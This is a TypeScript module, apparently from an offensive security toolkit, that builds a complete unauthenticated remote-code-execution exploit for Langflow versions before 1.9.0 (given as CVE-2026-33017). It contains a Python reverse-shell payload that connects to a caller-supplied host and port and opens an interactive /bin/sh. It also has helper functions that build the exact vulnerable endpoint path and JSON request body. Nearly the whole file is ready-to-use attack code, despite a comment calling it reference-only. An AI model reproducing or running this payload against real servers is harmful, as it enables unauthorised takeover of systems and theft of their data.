// CVE-2026-33017 (GHSA-vwmf-pq79-vjvx, CVSS 9.3): Langflow < 1.9.0's
// POST /api/v1/build_public_tmp/{flow_id}/flow needs no auth and passes a
// custom component's `code` field straight to exec() while building the
// graph -- assignment statements run immediately (during the build itself,
// not when the flow later "runs"), so the reverse shell doesn't need the
// component to ever be invoked. Reference-only, same shape as
// log4shellPayloads.ts: builds the exact request body, sends nothing itself.
// {LHOST}/{LPORT}/{FLOW_ID} are substituted by the caller.
export const LANGFLOW_RCE_CODE = `import socket,subprocess,os
_s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
_s.connect(("{LHOST}",{LPORT}))
os.dup2(_s.fileno(),0)
os.dup2(_s.fileno(),1)
os.dup2(_s.fileno(),2)
subprocess.Popen(["/bin/sh","-i"])

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class ExploitComp(Component):
    display_name = "X"
    outputs = [Output(display_name="O", name="o", method="r")]
    def r(self) -> Data:
        return Data(data={})
`;

export function buildLangflowRcePath(flowId: string): string {
  return `/api/v1/build_public_tmp/${flowId}/flow`;
}

export function buildLangflowRceBody(code: string): string {
  return JSON.stringify({
    data: {
      nodes: [{
        id: "Exploit-001",
        type: "genericNode",
        position: { x: 0, y: 0 },
        data: {
          id: "Exploit-001",
          type: "ExploitComp",
          node: {
            template: {
              code: { type: "code", required: true, value: code },
            },
          },
        },
      }],
      edges: [],
    },
    inputs: null,
  }, null, 2);
}
